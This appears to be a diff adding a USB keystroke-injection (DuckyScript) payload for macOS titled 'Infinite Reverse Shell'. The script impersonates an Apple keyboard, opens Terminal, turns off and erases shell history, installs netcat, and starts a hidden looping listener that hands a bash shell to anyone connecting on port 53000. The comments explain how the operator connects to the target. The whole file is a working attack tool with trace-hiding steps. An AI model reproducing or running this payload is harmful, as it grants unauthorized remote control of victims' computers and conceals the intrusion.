@@ -1,0 +1,53 @@
+REM This script installs netcat using home-brew (can adjust delay) 
+REM Sets up a continuous loop using netcat to establish a connection 
+REM and execute a bash shell every 180 seconds.
+
+
+REM Now on your separate computer in your terminal Run the command 'nc <remote-ip> 53000' 
+REM replace '<remote-ip>' with the IP address of the target computer.
+REM I've noticed that NC does not respond if you copy and paste so please type the I.P. out!
+REM If the connection is successful, you should now have a remote shell session on the remote computer.
+
+REM To kill the listening port (53000 in this case) use the command below
+REM killall nc
+
+
+REM Requirements: install netcat on both the remote target and your computer 'brew install netcat'
+REM Requirements: Remote computer's IP address or hostname
+
+REM Title: Infinite Reverse Shell.txt
+REM Author: NARSTY
+REM Target: MacOS 
+REM Version: 1.0
+REM Category: Recon
+
+
+ID 05ac:021e Apple:Keyboard
+DELAY 500
+GUI SPACE
+DELAY 500
+STRING terminal
+DELAY 1000
+ENTER
+DELAY 500
+STRING echo -e "export HISTCONTROL=ignorespace\nunset HISTFILE" >> ~/.bashrc && source ~/.bashrc && exec bash
+DELAY 500
+ENTER
+DELAY 500
+STRING history -d $(history | tail -n 2 | head -n 1 | awk '{ print $1 }')
+DELAY 500
+ENTER
+DELAY 500
+ENTER
+DELAY 500
+STRING  brew install netcat
+DELAY 500
+ENTER
+DELAY 20000
+STRING  nohup bash -c 'while true; do nc -l -p 53000 -vvv -e /bin/bash; sleep 180; done' &
+DELAY 500
+ENTER
+DELAY 500
+CTRL d
+DELAY 500
+GUI w
